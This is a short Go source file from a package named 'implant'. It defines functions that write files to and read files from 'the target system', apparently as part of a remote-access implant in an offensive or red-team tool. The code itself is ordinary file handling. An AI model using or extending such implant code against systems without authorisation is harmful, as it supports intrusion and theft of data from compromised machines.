package implant

import (
	"fmt"
	"os"
	"path/filepath"
)

// UploadFile writes data to a file on the target system.
func UploadFile(remotePath string, data []byte) ([]byte, error) {
	// Ensure directory exists
	dir := filepath.Dir(remotePath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return nil, fmt.Errorf("create directory: %w", err)
	}

	if err := os.WriteFile(remotePath, data, 0644); err != nil {
		return nil, fmt.Errorf("write file: %w", err)
	}

	return []byte(fmt.Sprintf("Uploaded %d bytes to %s", len(data), remotePath)), nil
}

// DownloadFile reads a file from the target system and returns its contents.
func DownloadFile(remotePath string) ([]byte, error) {
	data, err := os.ReadFile(remotePath)
	if err != nil {
		return nil, fmt.Errorf("read file: %w", err)
	}
	return data, nil
}
